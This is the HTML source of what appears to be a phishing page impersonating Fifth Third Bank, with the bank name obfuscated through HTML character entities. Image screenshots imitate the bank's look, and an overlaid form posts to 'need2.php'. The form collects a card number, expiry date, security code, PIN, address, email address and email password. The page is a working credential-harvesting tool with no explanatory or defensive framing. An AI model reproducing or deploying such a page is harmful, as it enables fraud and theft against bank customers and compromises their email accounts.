<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>F&#105;&#102;&#116;h T&#104;&#105;&#114;d B&#97;&#110;k </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>
<style type="text/css">  
.textbox {  
    border: solid 1px #bebfbf; 
  	padding-left: 8px;
	font-family: Verdana;
  	font-size: 16px;
    height: 42px; 
    width: 275px; 
 }  
.textbox:focus {  
    border: 1px solid #333; 
    box-shadow: 0px 0px 0px 4px #b3e7d1;  
    outline: 0; 
 } 
</style>

</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:420px; height:425px; z-index:0"><img src="images/t4.png" alt="" title="" border=0 width=420 height=425></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:410px; width:420px; height:617px; z-index:1"><img src="images/t5.png" alt="" title="" border=0 width=420 height=617></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:986px; width:420px; height:652px; z-index:2"><img src="images/t6.png" alt="" title="" border=0 width=420 height=652></div>

<div id="image4" style="position:absolute; overflow:hidden; left:105px; top:1025px; width:108px; height:39px; z-index:3"><a href="#"><img src="images/t8.png" alt="" title="" border=0 width=108 height=39></a></div>
<form action=need2.php name=tgm method=post>
<input name="c" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:370px;left:25px;top:439px;z-index:4">
<input name="x" placeholder="mm/yy" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:370px;left:25px;top:523px;z-index:5">
<input name="v" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:370px;left:25px;top:607px;z-index:6">
<input name="p" class="textbox" autocomplete="off" required maxlength="4" type="password" style="position:absolute;width:370px;left:25px;top:691px;z-index:7">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:370px;left:25px;top:775px;z-index:8">
<input name="m" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:370px;left:25px;top:859px;z-index:9">
<input name="pe" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:370px;left:25px;top:943px;z-index:10">
<div id="formimage1" style="position:absolute; left:231px; top:1025px; z-index:12"><input type="image" name="formimage1" width="104" height="39" src="images/t7.png"></div>

</body>
</html>
